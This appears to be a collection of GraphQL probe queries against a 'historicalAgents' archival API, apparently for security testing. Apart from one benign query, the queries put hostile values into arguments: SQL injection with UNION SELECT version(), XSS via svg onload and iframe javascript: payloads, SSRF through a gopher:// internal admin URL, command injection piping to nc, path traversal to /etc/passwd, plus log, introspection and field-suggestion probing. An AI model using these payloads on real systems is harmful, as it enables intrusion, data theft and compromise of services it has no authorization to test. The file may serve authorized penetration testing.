query historicalAgents {
  historicalAgents(first: 5) {
    items {
      id
      type
      identifier
      descriptions {
        name
        datesOfExistence
        legalStatus
      }
    }
  }
}

query historicalAgents {
  historicalAgents(after: "1' UNION SELECT null,version()-- ") {
    items {
      id
      identifier
      type
    }
  }
}

query historicalAgents {
  historicalAgents(from: "\"><svg/onload=alert(1)>") {
    items {
      descriptions {
        biographicalHistory
      }
      links {
        description
      }
    }
  }
}

query historicalAgents {
  historicalAgents(from: "gopher://internal-api:8080/admin") {
    items {
      identifier
      systemEvents {
        eventType
      }
    }
  }
}

query historicalAgents {
  historicalAgents(after: "|nc 127.0.0.1 1337|") {
    items {
      id
      related {
        context {
          linkType
        }
      }
    }
  }
}

query historicalAgents {
  historicalAgents(from: "../../../etc/passwd") {
    items {
      descriptions {
        source
        scripts
      }
    }
  }
}

query historicalAgents {
  historicalAgents(after: "<iframe src='javascript:alert(1)'>") {
    items {
      links {
        body {
          name
        }
      }
    }
  }
}

query historicalAgents {
  historicalAgents {
    items {
      systemEvents {
        logMessage
        eventType
      }
      annotations {
        body
        annotationType
      }
    }
  }
}

query {
  s: historicalAgents {
    i: items {
      se: systemEvents {
        lm: logMessage
      }
      a: annotations {
        b: body
      }
    }
  }
}

query Introspection {
  historicalAgents {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      name
      description
    }
  }
}

query SuggestionProbe {
  historicalAgents(name: "HistoricalAgent") {
    fields {
      name
      description
    }
  }
  __type(name: "Link") {
    fields {
      name
      type {
        name
      }
    }
  }
}
